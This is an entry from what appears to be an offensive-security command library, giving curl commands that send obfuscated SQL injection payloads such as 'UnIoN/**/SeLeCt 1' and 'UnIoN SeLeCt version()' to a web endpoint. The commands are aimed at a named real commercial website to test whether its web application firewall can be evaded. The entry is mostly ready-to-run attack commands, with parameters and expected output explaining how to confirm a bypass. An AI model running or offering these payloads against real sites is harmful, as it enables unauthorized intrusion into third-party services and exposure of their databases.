---
id: cmd-258582-curl-bypass
data: 'curl -X GET "https://www.zomato.com/endpoint?param=UnIoN/**/SeLeCt 1" -v'
tags:
  - web-testing
  - sqli
  - waf-bypass
type: command
output: HTTP/1.1 200 OK ... (application response without block)
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:41.043Z'
verified: false
validated: true
submitted: true
---
# curl-waf-bypass-test

## Command

```bash
curl -X GET "https://www.zomato.com/endpoint?param=UnIoN/**/SeLeCt 1" -v
```

## Description

This curl command tests WAF evasion by sending an obfuscated SQL union payload to a web endpoint, using verbose mode to inspect headers and responses for bypass confirmation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies HTTP GET method | Yes |
| `URL` | Target endpoint with injected payload | Yes |
| `-v` | Verbose output for debugging | No |
| `-H` | Add custom headers like User-Agent | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://www.zomato.com/endpoint?param='" -v
```

### Advanced Usage

```bash
curl -X GET "https://www.zomato.com/endpoint?param=UnIoN SeLeCt version()" -H "User-Agent: Mozilla/5.0" -v
```

## Expected Output

Verbose logs showing request/response headers, followed by a 200 OK status and application content (e.g., partial SQL results) if bypass succeeds; otherwise, 403 or WAF block page.

## Related

- [[Related Procedure: Bypass-WAF-for-SQL-Injection-Exploitation]]
- [[commands/sqlmap-waf-bypass]]
